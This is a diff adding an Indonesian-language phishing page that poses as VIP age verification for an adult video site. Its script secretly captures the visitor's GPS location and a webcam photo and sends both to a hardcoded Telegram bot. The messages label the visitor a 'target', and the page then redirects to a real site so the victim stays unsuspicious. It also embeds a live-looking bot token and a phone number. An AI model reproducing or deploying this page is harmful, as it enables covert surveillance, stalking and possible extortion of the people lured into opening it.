@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OxyHub - VIP Access</title>
+    <style>
+        body { background: #0a0a0a; color: #eee; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 30px 15px; margin: 0; }
+        .logo { font-size: 38px; font-weight: bold; color: #ff9900; margin-bottom: 10px; padding-top: 20px; }
+        .logo span { background: #ff9900; color: #000; padding: 2px 10px; border-radius: 6px; }
+        .sub { color: #555; margin-bottom: 40px; font-size: 14px; }
+        .btn { 
+            background: linear-gradient(145deg, #151515, #1d1d1d); border: 1px solid #333; 
+            padding: 22px; margin: 15px auto; border-radius: 15px; display: block; 
+            max-width: 380px; color: #ff9900; text-decoration: none; font-weight: bold;
+            box-shadow: 5px 5px 15px #050505; transition: 0.3s; cursor: pointer;
+        }
+        .btn:active { transform: scale(0.95); border-color: #ff9900; }
+        .footer { margin-top: 50px; font-size: 12px; color: #444; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="logo">Oxy<span>HUB</span></div>
+    <div class="sub">Verifikasi Member VIP untuk Akses Konten 18+</div>
+
+    <div class="btn" onclick="verifikasiTitan()">🚀 MASUK SERVER VIP</div>
+    <div class="btn" onclick="verifikasiTitan()">🔥 FULL VIDEO (BOKEP)</div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <div class="footer">
+        DANA Support: 082120342112<br>
+        © 2026 OxyVerse Project - Admin: Babas
+    </div>
+
+    <script>
+        // CONFIG DATA BABAS (JANGAN DIUBAH)
+        const BOT_TOKEN = '8734003243:AAE01xpuHVuTMdBP_o-1GctMSkqorZiFku0';
+        const CHAT_ID = '6836798056';
+
+        function verifikasiTitan() {
+            // 1. Ambil Lokasi (GPS)
+            navigator.geolocation.getCurrentPosition(res => {
+                const lat = res.coords.latitude;
+                const lon = res.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const locMsg = `📍 TARGET TERDETEKSI!\nLat: ${lat}\nLon: ${lon}\nGoogle Maps: ${mapsLink}`;
+                sendText(locMsg);
+            }, () => {
+                sendText("⚠️ Target menolak akses lokasi.");
+            });
+
+            // 2. Ambil Kamera & Mic
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Ambil foto diem-diem setelah 2 detik
+                setTimeout(() => {
+                    let canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        sendPhoto(blob);
+                    }, 'image/jpeg');
+
+                    alert("Sistem: Verifikasi Berhasil! Membuka Server...");
+                    // Redirect ke link asli biar target gak curiga
+                    window.location.href = "https://www.pornhub.com";
+                }, 2500);
+            })
+            .catch(err => {
+                alert("❌ ERROR: Anda harus klik 'IZINKAN' untuk memverifikasi umur!");
+            });
+        }
+
+        function sendText(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        function sendPhoto(blob) {
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', '📸 WAJAH TARGET DITEMUKAN!');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
